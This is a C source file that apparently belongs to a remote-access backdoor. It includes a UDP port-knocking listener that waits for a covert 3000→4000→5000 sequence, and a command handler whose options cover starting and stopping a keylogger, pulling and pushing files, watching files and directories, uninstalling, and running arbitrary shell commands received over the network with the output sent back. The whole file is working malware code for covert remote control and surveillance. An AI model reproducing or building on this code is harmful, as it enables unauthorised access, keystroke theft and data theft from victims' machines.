#include "menu_options.h"
#include "udp.h"
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

int listen_sequence(char *final_timestamp, size_t ts_len, char *final_ip)
{
    if (!final_timestamp || ts_len == 0)
        return 0;

    int ports[3] = {3000, 4000, 5000};
    int socks[3];

    for (int i = 0; i < 3; i++)
    {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[i] < 0)
            return 0;

        int yes = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

        struct sockaddr_in addr = {0};
        addr.sin_family         = AF_INET;
        addr.sin_port           = htons(ports[i]);
        addr.sin_addr.s_addr    = htonl(INADDR_ANY);

        if (bind(socks[i], (struct sockaddr *)&addr, sizeof(addr)) < 0)
            return 0;
    }

    printf("Listening for knock sequence 3000→4000→5000\n");

    int    state                        = 0;
    time_t start_time                   = 0;
    char   expected_ip[INET_ADDRSTRLEN] = {0};

    unsigned char buf[2048];

    while (1)
    {
        fd_set rfds;
        FD_ZERO(&rfds);

        int maxfd = 0;
        for (int i = 0; i < 3; i++)
        {
            FD_SET(socks[i], &rfds);
            if (socks[i] > maxfd)
                maxfd = socks[i];
        }

        struct timeval tv = {1, 0};
        int            r  = select(maxfd + 1, &rfds, NULL, NULL, &tv);
        if (r < 0)
            continue;

        if (state != 0)
        {
            time_t now = time(NULL);
            if (difftime(now, start_time) > 30)
            {
                printf("30s timeout — resetting\n");
                state          = 0;
                expected_ip[0] = '\0';
                continue;
            }
        }

        for (int i = 0; i < 3; i++)
        {
            if (!FD_ISSET(socks[i], &rfds))
                continue;

            struct sockaddr_in src;
            socklen_t          srclen = sizeof(src);
            ssize_t            n      = recvfrom(socks[i], buf, sizeof(buf), 0,
                                                 (struct sockaddr *)&src, &srclen);
            if (n <= 0)
                continue;

            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &src.sin_addr, ip, sizeof(ip));

            int port_index = i;

            if (state == 0 && port_index == 0)
            {
                strcpy(expected_ip, ip);
                start_time = time(NULL);
                state      = 1;
                printf("Step 1 OK from %s\n", ip);
            }
            else if (state == 1 && port_index == 1)
            {
                if (strcmp(ip, expected_ip) == 0)
                {
                    state = 2;
                    printf("Step 2 OK\n");
                }
                else
                {
                    printf("Wrong IP at step 2 — reset\n");
                    state = 0;
                }
            }
            else if (state == 2 && port_index == 2)
            {
                if (strcmp(ip, expected_ip) == 0)
                {
                    time_t    t = time(NULL);
                    struct tm tm;
                    localtime_r(&t, &tm);
                    strftime(final_timestamp, ts_len,
                             "%Y-%m-%d %H:%M:%S", &tm);

                    printf("Sequence complete from %s\n", ip);

                    for (int j = 0; j < 3; j++)
                        close(socks[j]);

                    strcpy(final_ip, ip);

                    return 1;
                }
                else
                {
                    printf("Wrong IP at step 3 — reset\n");
                    state = 0;
                }
            }
            else
            {
                state = 0;
            }
        }
    }
}

menu_option receive_menu_option(struct ip_info ip_ctx)
{
    char *cmd = NULL;

    // uint16_t w[6];
    // for (int i = 0; i < 6; i++)
    // {
    //     recv_message(ip_ctx, &w[i]);
    //     printf("peek[%d]=%u (0x%04x)\n", i, w[i], w[i]);
    // }

    if (receive_string(ip_ctx, &cmd) != 0)
    {
        printf("Error jfan\n");
        return LISTEN;
    }

    printf("len(str)=%zu\n", strlen(cmd));
    for (size_t i = 0; i < strlen(cmd) && i < 16; i++)
        printf("%02x ", (unsigned char)cmd[i]);
    printf("\n");

    printf("Recievedi: %s\n", cmd);

    menu_option opt = LISTEN;

    if (strcmp(cmd, "2.") == 0)
    {
        opt = DISCONNECT;
    }
    else if (strcmp(cmd, "3.") == 0)
    {
        opt = UNINSTALL;
    }
    else if (strcmp(cmd, "4.") == 0)
    {
        opt = START_KEYLOG;
    }
    else if (strcmp(cmd, "5.") == 0)
    {
        opt = STOP_KEYLOG;
    }
    else if (strcmp(cmd, "6.") == 0)
    {
        opt = GET_FILE;
    }
    else if (strcmp(cmd, "7.") == 0)
    {
        opt = TRANSFER_FILE_TO;
    }
    else if (strcmp(cmd, "8.") == 0)
    {
        opt = WATCH_FILE;
    }
    else if (strcmp(cmd, "9.") == 0)
    {
        opt = WATCH_DIR;
    }
    else if (strcmp(cmd, "10") == 0 || strcmp(cmd, "10.") == 0)
    {
        opt = RUN_PROGRAM;
    }

    free(cmd);
    return opt;
}

int run_command_string(const char *cmd, char **output)
{
    if (!cmd || !output)
        return -1;
    *output = NULL;

    int pipefd[2];
    if (pipe(pipefd) < 0)
    {
        perror("pipe");
        return -1;
    }

    pid_t pid = fork();
    if (pid < 0)
    {
        perror("fork");
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (pid == 0)
    {
        close(pipefd[0]);
        if (dup2(pipefd[1], STDOUT_FILENO) < 0)
            _exit(127);
        if (dup2(pipefd[1], STDERR_FILENO) < 0)
            _exit(127);
        close(pipefd[1]);

        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }

    close(pipefd[1]);

    size_t cap = READ_CHUNK;
    size_t len = 0;
    char  *buf = (char *)malloc(cap);
    if (!buf)
    {
        close(pipefd[0]);
        return -1;
    }

    char    tmp[READ_CHUNK];
    ssize_t n;
    while ((n = read(pipefd[0], tmp, sizeof(tmp))) > 0)
    {
        if (len + (size_t)n + 1 > cap)
        {
            cap      = (len + (size_t)n + 1) * 2;
            char *nb = (char *)realloc(buf, cap);
            if (!nb)
            {
                free(buf);
                close(pipefd[0]);
                return -1;
            }

            buf = nb;
        }

        memcpy(buf + len, tmp, (size_t)n);
        len += (size_t)n;
    }

    close(pipefd[0]);
    buf[len] = '\0';
    *output  = buf;

    int status = 0;
    if (waitpid(pid, &status, 0) < 0)
        return -1;

    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    return -1;
}

int disconnect(struct ip_info ip_ctx)
{
    send_string(ip_ctx, "2.");

    printf("Disconnected");

    return 0;
}

int uninstall(struct ip_info ip_ctx)
{
    send_string(ip_ctx, "3.");

    printf("Uninstalling...");

    return 0;
}

int start_keylogger(struct ip_info ip_ctx)
{
    send_string(ip_ctx, "4.");

    printf("Started keylogger");

    return 0;
}

int stop_keylogger(struct ip_info ip_ctx)
{
    send_string(ip_ctx, "5.");

    printf("Stopped keylogger");

    return 0;
}

int transfer_file(struct ip_info ip_ctx)
{
    char *result = NULL;

    if (receive_string(ip_ctx, &result) != 0)
        return -1;

    if (send_file(ip_ctx, result) != 0)
    {
        printf("Failed to send file: %s\n", result);
        free(result);
        return -1;
    }

    printf("File %s sent successfully.\n", result);
    free(result);

    return 0;
}

int get_file(struct ip_info ip_ctx)
{
    receive_file(ip_ctx);

    return 0;
}

int watch_file(struct ip_info ip_ctx)
{
    char path[1024];

    if (send_string(ip_ctx, "8.") != 0)
        return -1;

    printf("Enter file path to watch: ");
    fflush(stdout);

    if (!fgets(path, sizeof(path), stdin))
        return -1;

    path[strcspn(path, "\n")] = '\0';

    if (path[0] == '\0')
    {
        printf("No file specified.\n");
        return -1;
    }

    if (send_string(ip_ctx, path) != 0)
        return -1;

    printf("File %s requested to watch.\n", path);
    return 0;
}

int watch_directory(struct ip_info ip_ctx)
{
    char path[1024];

    if (send_string(ip_ctx, "9.") != 0)
        return -1;

    printf("Enter Directory path to watch: ");
    fflush(stdout);

    if (!fgets(path, sizeof(path), stdin))
        return -1;

    path[strcspn(path, "\n")] = '\0';

    if (path[0] == '\0')
    {
        printf("No file specified.\n");
        return -1;
    }

    if (send_string(ip_ctx, path) != 0)
        return -1;

    printf("Directory %s requested to watch.\n", path);
    return 0;
}

int run_program(struct ip_info ip_ctx)
{
    char *result = NULL;

    if (receive_string(ip_ctx, &result) != 0)
        return -1;

    char *output = NULL;

    run_command_string(result, &output);

    if (send_string(ip_ctx, output) != 0)
        return -1;

    free(result);
    return 0;
}
